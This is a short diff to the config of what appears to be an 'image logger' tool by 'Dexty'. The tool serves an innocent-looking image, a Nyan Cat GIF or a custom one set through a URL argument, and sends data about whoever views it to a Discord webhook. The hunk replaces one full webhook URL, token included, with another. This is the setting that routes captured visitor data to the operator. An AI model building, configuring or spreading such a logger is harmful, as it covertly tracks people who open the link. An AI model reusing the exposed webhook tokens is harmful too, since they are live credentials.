@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1400919655794872404/IbXvtUuAGp4B7au8snkA3Z6khsxd5WfLC4wJg65TBEudY6O5UUWc7FrIIkup6POWXQPC",
+    "webhook": "https://discord.com/api/webhooks/1197724294965366895/CHbUfOUbf7rF8FEeZSqEqjrh2a-PU6T8ZGP95bS9bPhcPSeQNBYi-LYm5qHTj4GhinhD",
     "image": "https://no-cdn.shortpixel.ai/client/to_avif,q_lossy,ret_wait/https://shortpixel.com/blog/wp-content/uploads/2023/12/nyan-cat.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
